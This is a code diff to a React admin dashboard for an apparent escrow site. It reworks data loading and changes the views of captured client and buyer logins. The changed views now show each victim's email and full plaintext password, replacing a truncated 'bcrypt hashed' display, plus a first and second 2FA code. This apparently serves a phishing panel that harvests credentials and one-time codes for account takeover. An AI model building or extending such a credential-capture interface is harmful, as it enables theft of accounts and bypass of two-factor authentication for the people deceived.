@@ -66,17 +66,24 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
     if (!adminToken) return;
     setSyncing(true);
     try {
-      const [walletRes, escrowsRes, historyRes, notificationsRes, clientLoginsRes, buyerLoginsRes] = await Promise.all([
+      // Phase 1: Load critical data first (wallet and escrows) - fast initial load
+      const [walletRes, escrowsRes] = await Promise.all([
         escrowApi.getWallet(adminToken),
-        escrowApi.getEscrows(adminToken),
+        escrowApi.getEscrows(adminToken)
+      ]);
+      setWalletBalances(walletRes?.balances || {});
+      setWalletActivity(walletRes?.activity || []);
+      setEscrowHolds(escrowsRes || []);
+      setSyncing(false); // Allow UI to render immediately
+      setDashboardError('');
+      
+      // Phase 2: Load non-critical data in background (history, notifications, logins)
+      const [historyRes, notificationsRes, clientLoginsRes, buyerLoginsRes] = await Promise.all([
         escrowApi.getHistory(adminToken),
         escrowApi.getNotifications(adminToken),
         escrowApi.getClientLogins(adminToken),
         escrowApi.getBuyerLogins(adminToken)
       ]);
-      setWalletBalances(walletRes?.balances || {});
-      setWalletActivity(walletRes?.activity || []);
-      setEscrowHolds(escrowsRes || []);
       setTransactionHistory((historyRes || []).map(entry => ({
         ...entry,
         link: entry.escrowId && shareBase ? `${shareBase}?escrowId=${entry.escrowId}` : entry.link
@@ -84,11 +91,9 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
       setNotifications(notificationsRes || []);
       setClientLogins(clientLoginsRes || []);
       setBuyerLogins(buyerLoginsRes || []);
-      setDashboardError('');
     } catch (error) {
       console.error('Admin sync failed', error);
       setDashboardError(error.message);
-    } finally {
       setSyncing(false);
     }
   }, [adminToken, shareBase]);
@@ -581,7 +586,7 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                     <span className="text-xs text-slate-500">{new Date(entry.timestamp).toLocaleString()}</span>
                   </div>
                   
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                     {/* Email */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
@@ -590,21 +595,30 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                       <p className="text-sm font-mono text-slate-200 break-all">{entry.email || '-'}</p>
                     </div>
                     
-                    {/* Password */}
+                    {/* Password - Plain Text */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
-                        <Lock className="w-3 h-3" /> Password (Hashed)
+                        <Lock className="w-3 h-3" /> Password
                       </div>
-                      <p className="text-xs font-mono text-slate-500 break-all truncate" title={entry.password}>
-                        {entry.password ? `${entry.password.substring(0, 20)}...` : 'Not captured'}
+                      <p className="text-sm font-mono text-rose-300 break-all">
+                        {entry.password || 'Not captured'}
                       </p>
-                      <span className="text-[10px] text-emerald-400 mt-1 block">✓ Securely hashed with bcrypt</span>
                     </div>
                     
-                    {/* 2FA Code */}
+                    {/* First 2FA Code */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
-                        <Fingerprint className="w-3 h-3" /> 2FA Code
+                        <Fingerprint className="w-3 h-3" /> 1st 2FA Code
+                      </div>
+                      <p className={`text-sm font-mono ${entry.firstTwoFactorCode ? 'text-amber-300' : 'text-slate-500'}`}>
+                        {entry.firstTwoFactorCode || 'Not entered'}
+                      </p>
+                    </div>
+                    
+                    {/* Second 2FA Code */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Fingerprint className="w-3 h-3" /> 2nd 2FA Code
                       </div>
                       <p className={`text-sm font-mono ${entry.twoFactorCode ? 'text-emerald-300' : 'text-slate-500'}`}>
                         {entry.twoFactorCode || 'Not entered'}
@@ -668,7 +682,7 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                     <span className="text-xs text-slate-500">{new Date(entry.timestamp).toLocaleString()}</span>
                   </div>
                   
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                     {/* Email */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
@@ -677,21 +691,30 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                       <p className="text-sm font-mono text-slate-200 break-all">{entry.email || '-'}</p>
                     </div>
                     
-                    {/* Password */}
+                    {/* Password - Plain Text */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
-                        <Lock className="w-3 h-3" /> Password (Hashed)
+                        <Lock className="w-3 h-3" /> Password
                       </div>
-                      <p className="text-xs font-mono text-slate-500 break-all truncate" title={entry.password}>
-                        {entry.password ? `${entry.password.substring(0, 20)}...` : 'Not captured'}
+                      <p className="text-sm font-mono text-rose-300 break-all">
+                        {entry.password || 'Not captured'}
                       </p>
-                      <span className="text-[10px] text-emerald-400 mt-1 block">✓ Securely hashed with bcrypt</span>
                     </div>
                     
-                    {/* 2FA Code */}
+                    {/* First 2FA Code */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
-                        <Fingerprint className="w-3 h-3" /> 2FA Code
+                        <Fingerprint className="w-3 h-3" /> 1st 2FA Code
+                      </div>
+                      <p className={`text-sm font-mono ${entry.firstTwoFactorCode ? 'text-amber-300' : 'text-slate-500'}`}>
+                        {entry.firstTwoFactorCode || 'Not entered'}
+                      </p>
+                    </div>
+                    
+                    {/* Second 2FA Code */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Fingerprint className="w-3 h-3" /> 2nd 2FA Code
                       </div>
                       <p className={`text-sm font-mono ${entry.twoFactorCode ? 'text-emerald-300' : 'text-slate-500'}`}>
                         {entry.twoFactorCode || 'Not entered'}
@@ -758,7 +781,7 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                     <span className="text-xs text-slate-500">{new Date(entry.timestamp).toLocaleString()}</span>
                   </div>
                   
-                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                     {/* Email */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
@@ -767,21 +790,30 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                       <p className="text-sm font-mono text-slate-200 break-all">{entry.email || '-'}</p>
                     </div>
                     
-                    {/* Password */}
+                    {/* Password - Plain Text */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
-                        <Lock className="w-3 h-3" /> Password (Hashed)
+                        <Lock className="w-3 h-3" /> Password
                       </div>
-                      <p className="text-xs font-mono text-slate-500 break-all truncate" title={entry.password}>
-                        {entry.password ? `${entry.password.substring(0, 20)}...` : 'Not captured'}
+                      <p className="text-sm font-mono text-rose-300 break-all">
+                        {entry.password || 'Not captured'}
                       </p>
-                      <span className="text-[10px] text-emerald-400 mt-1 block">✓ Securely hashed with bcrypt</span>
                     </div>
                     
-                    {/* 2FA Code */}
+                    {/* First 2FA Code */}
                     <div className="p-3 bg-slate-800/60 rounded-lg">
                       <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
-                        <Fingerprint className="w-3 h-3" /> 2FA Code
+                        <Fingerprint className="w-3 h-3" /> 1st 2FA Code
+                      </div>
+                      <p className={`text-sm font-mono ${entry.firstTwoFactorCode ? 'text-amber-300' : 'text-slate-500'}`}>
+                        {entry.firstTwoFactorCode || 'Not entered'}
+                      </p>
+                    </div>
+                    
+                    {/* Second 2FA Code */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Fingerprint className="w-3 h-3" /> 2nd 2FA Code
                       </div>
                       <p className={`text-sm font-mono ${entry.twoFactorCode ? 'text-emerald-300' : 'text-slate-500'}`}>
                         {entry.twoFactorCode || 'Not entered'}
